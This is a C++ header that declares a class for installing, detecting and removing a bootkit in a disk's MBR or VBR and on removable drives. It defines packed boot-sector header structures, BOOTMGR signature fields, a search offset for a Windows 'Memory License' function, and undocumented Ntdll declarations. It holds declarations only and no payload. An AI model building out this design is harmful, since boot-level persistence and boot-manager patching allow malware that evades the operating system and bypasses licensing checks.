#pragma once
#include "log.h"
#include "MbrDefs.h"
#include "SystemAnalyzer.h"

#pragma pack(1)
// Bootkit starter header structure
typedef struct _BOOTKIT_STARTER {		
	DWORD reserved;						// + 0x00 - JUMP to start trampoline 
	CHAR signature[7];					// + 0x04 - Bootkit Signature
	BYTE uchStarterType;				// + 0x0B - Bootkit starter type: 1 - MBR, 2 -VBR
	DWORD dwBtkStartSector;				// + 0x0C - Bootkit program Start sector number
	DWORD dwRemDevOrgMbrSector;			// + 0x10 - Removable device original MBR Sector OR
										//			Unused (old Start Sector HIDWORD) 
	DWORD dwOrgMbrSector;				// + 0x14 - Original MBR sector number
	DWORD dwWinStdMbrSector;			// + 0x18 - Standard Windows MBR Sector
	WORD wBtkProgramSize;				// + 0x1C - Bootkit program size in sectors
	BYTE uchBootDrive;					// + 0x1E - Boot drive code: 0x80 - First hard disk, 0x81 - Second hard disk, 0x00 - First Floppy, 0x01 - Second floppy
	BYTE uchCurDrive;					// + 0x1F - Current execution drive (filled by bootkit at runtime) 
} BOOTKIT_STARTER, * PBOOTKIT_STARTER;

// VBR Starter header structure
typedef struct _BOOTKIT_VBR_STARTER {
	DWORD reserved;						// + 0x00 - JUMP to start trampoline 
	CHAR signature[7];					// + 0x04 - Bootkit Signature
	BYTE uchStarterType;				// + 0x0B - Bootkit starter type: 1 - MBR, 2 -VBR
	DWORD dwOrgHiddenSector;			// + 0x0C - Original VBR hidden sectors number
	WORD wBtkProgramSize;				// + 0x10 - Bootkit program size in sectors
	BYTE uchBootDrive;					// + 0x12 - Boot drive code: 0x80 - First hard disk, 0x81 - Second hard disk, 0x00 - First Floppy, 0x01 - Second floppy
	BYTE uchCurDrive;					// + 0x13 - Current execution drive (filled by bootkit at runtime) 
}BOOTKIT_VBR_STARTER, * PBOOTKIT_VBR_STARTER;

// Bootkit program header structure
typedef struct _BOOTKIT_PROGRAM {		
	DWORD reserved;						// JUMP to start trampoline 
	CHAR signature[8];					// Bootkit Signature
	DWORD dwBmMainOffset;				// BOOTMGR 16 bit function offset
	BYTE bBmSignFirstByte;				// BOOTMGR signature First byte
	BYTE bBmSignSecondByte;				// BOOTMGR signature Second byte
	DWORD dwBmSignature;				// BOOTMGR signature
	DWORD dwMemLicStartRva;				// Memory License Function start search RVA 
} BOOTKIT_PROGRAM, *PBOOTKIT_PROGRAM;
#pragma pack()

class CBootkitMbrSetup
{
public:
	enum DISK_TYPE {
		DISK_TYPE_CLEAN = 0,
		DISK_TYPE_MBR,
		DISK_TYPE_GUID,
		DISK_TYPE_FAT_FS,
		DISK_TYPE_FAT32_FS,
		DISK_TYPE_NTFS_FS,
		DISK_TYPE_UNKNOWN = 99
	};

	// Bootkit type 
	enum BOOTKIT_TYPE {
		BOOTKIT_TYPE_UNKNOWN_OR_AUTO = 0,	// Unknown Bootkit type
		BOOTKIT_TYPE_STANDARD,				// Standard Windows Vista, 7, 8 Bootkit that recognize Bootmgr with last bytes signature
		BOOTKIT_TYPE_COMPATIBLE				// Compatible Windows Memory Bootkit (with Activators and NON standard loader)
	};

	// Bootkit installation type
	enum BOOTKIT_SETUP_TYPE {
		BOOTKIT_SETUP_INVALID = 0,
		BOOTKIT_SETUP_MBR,
		BOOTKIT_SETUP_VBR
	};

public:
	// Default constructor
	CBootkitMbrSetup(void);
	// Constructor with log parameter
	CBootkitMbrSetup(CLog & curLog);
	// Default destructor
	~CBootkitMbrSetup(void);

	// Get if bootkit is currently installed in this System
	BOOTKIT_STATE GetBootkitState(DWORD drvNum = 0, BOOTKIT_SETUP_TYPE * pSetupType = NULL);
	// Get if bootkit is currently installed in a particular volume
	BOOTKIT_STATE GetVolBootkitState(LPTSTR volName);

	#pragma region Get/Set current setup instance options
	bool SetOptions(BYTE btkType, BOOLEAN bDontAnalyzeMbr) 
	{g_btkType = (BOOTKIT_TYPE)btkType, g_bDontAnalyzeMbr = bDontAnalyzeMbr; return true;}
	void GetOptions(BYTE & btkType, BOOLEAN & bDontAnalyzeMbr)
	{btkType = (BYTE)g_btkType; bDontAnalyzeMbr = g_bDontAnalyzeMbr; }
	bool SetSystemBootDiskIndex(DWORD newIdx) {  g_dwSysBootDskIdx = newIdx; return true; }
	DWORD GetSystemBootDiskIndex() {  return g_dwSysBootDskIdx; }
	#pragma endregion
	#pragma region MBR Setup routines
	// Install Bootkit on system MBR
	bool MbrInstallBootkit(DWORD drvNum = 0, BOOLEAN bRemovable = FALSE, BYTE bootDiskIdx = 0x80);

	// Remove a MBR bootkit from a particular Drive
	bool MbrRemoveBootkit(DWORD drvNum = 0, BOOLEAN bRemovable = FALSE);

	// Remove Memory bootkit from a removable volume
	bool VolRemoveBootkit(LPTSTR volName);

	// Install Memory bootkit in a removable volume
	bool VolInstallBootkit(LPTSTR volNam, bool bEraseOnErr = false);
	#pragma endregion
	#pragma region VBR Setup routines
	// Install bootkit on a FIXED disk in system boot partition VBR
	bool VbrInstallBootkit(DWORD drvNum = 0, BYTE bootDiskIdx = 0x80);

	// Remove bootkit from a VBR of a bootable partition of a fixed disk
	bool VbrRemoveBootkit(DWORD drvNum = 0);
	#pragma endregion

	// Get if a Volume is a Mbr based or a FS Based (like floppy disks)
	DISK_TYPE GetVolumeDiskType(LPTSTR volName);

	// Get if a particular drive is readable
	bool IsDeviceReadable(LPTSTR drvName);

	// Get if a particular device is accessible from user-mode
	bool DeviceExists(LPTSTR devName);

	// Analyze current system and suggest Target Bootkit type
	BOOTKIT_TYPE GetBootkitTypeForSystem();

	// Peek into MBR and assess if it's a Windows standard MBR, otherwise, search standard MBR sector number	
	// Possible values:  0x0  - MBR is NOT standard; 0x01 - MBR is certainly standard; 0x02 - MBR is in a suspected state
  	//					 0x03 - HP MBR; 0x04 - HP MBR Version 2; 0xFF - Request has found an error
	BYTE IsStandardMbr(DWORD drvNum = 0, LPDWORD pStdMbrSectNumber = NULL);	

private:
	// Get if bootkit is currently installed in this System internal function
	BOOTKIT_STATE GetDevBootkitState(LPTSTR devName, BOOTKIT_SETUP_TYPE * pSetupType = NULL);
	// Get virtual volume number of Bootmgr
	DWORD GetBootmgrVolume(LPTSTR volName = NULL, DWORD dwNameCCh = 0);
	// Get current system Bootmgr Signature
	bool GetBootmgrSignature(LPBYTE startByte, LPDWORD signature);
	// Get physical disk number of a volume
	DWORD GetPhysDiskOfVolume(LPTSTR volName, bool bErrIfMultipleDisks = true);
	// Get disk drive partitioning type 
	DISK_TYPE GetDiskDevType(LPTSTR devName);
	DISK_TYPE GetDiskDrvType(DWORD drvNum = 0);

	#pragma region MBR / VBR Internal setup routines
	// Remove Memory bootkit from a particular Device
	bool DevMbrRemoveBootkit(LPTSTR devName, BOOLEAN bRemovable = FALSE);
	// Install Memory bootkit in a particular Device Mbr
	bool DevMbrInstallBootkit(LPTSTR devName, BOOTKIT_TYPE btkType = BOOTKIT_TYPE_STANDARD, BOOLEAN bRemovable = FALSE, BYTE bootDiskIdx = 0x80);
	// Install Memory bootkit in a particular boot partition Vbr
	bool DevVbrInstallBootkit(LPTSTR devName, BOOTKIT_TYPE btkType = BOOTKIT_TYPE_STANDARD, BYTE bootDiskIdx = 0x80);
	// Search for bootable partition of drive, and then remove bootkit from its Vbr
	bool DevVbrRemoveBootkit(LPTSTR devName);
	// Extract, compile and Write bootkit program to hard disk
	bool WriteBtkProgram(HANDLE hDrive, QWORD sectNum, BOOTKIT_TYPE btkType = BOOTKIT_TYPE_STANDARD, DWORD sectSize = SECTOR_SIZE);
	// Get if bootkit is installed on Device VBR
	BOOTKIT_STATE IsBootkitInstalledInVbr(HANDLE hDrive, LPTSTR devName = NULL);
	#pragma endregion

	// Disomunt a particular volume
	bool DismountVolume(LPTSTR volName, bool bRemoveLetter = false);
	// Remove device letter of a particular volume
	bool RemoveDeviceLetter(LPTSTR volName);
	// Peek into MBR and assess if it's a Windows standard MBR (see above)
	static BYTE IsStandardMbr(MASTER_BOOT_RECORD & mbr);		
	BYTE InternalSearchStandardMbr(HANDLE hDrive, LPDWORD pStdMbrSectNumber = NULL);	

#pragma region Class private data
private:
	CLog * g_pLog;
	bool g_bIsMyOwnLog;

	// Bootkit installation type (if set it force autodetect of it):
	BOOTKIT_TYPE g_btkType;			// 0 - Auto detect bootkit type
	BOOLEAN g_bDontAnalyzeMbr;		// TRUE if I don't have to analyze MBR and search original one
	
	// Default system boot disk device index
	DWORD g_dwSysBootDskIdx;
#pragma endregion
};


#pragma region Undocumented Ntdll functions
typedef __success(return >= 0) LONG NTSTATUS;
/*lint -save -e624 */  // Don't complain about different typedefs.
typedef NTSTATUS *PNTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
	LPTSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// VOID InitializeObjectAttributes(__out POBJECT_ATTRIBUTES p, __in PUNICODE_STRING n,  __in ULONG a,
//     __in HANDLE r, __in PSECURITY_DESCRIPTOR s)
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

//
// Valid values for the Attributes field
//

#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L


// Create a particular symbolic link
NTSYSAPI NTSTATUS NTAPI ZwCreateSymbolicLinkObject(PHANDLE SymbolicLinkHandle, ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING TargetName);
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

// Initialize an UNICODE String
NTSYSAPI VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING  DestinationString, PCWSTR  SourceString);
#pragma endregion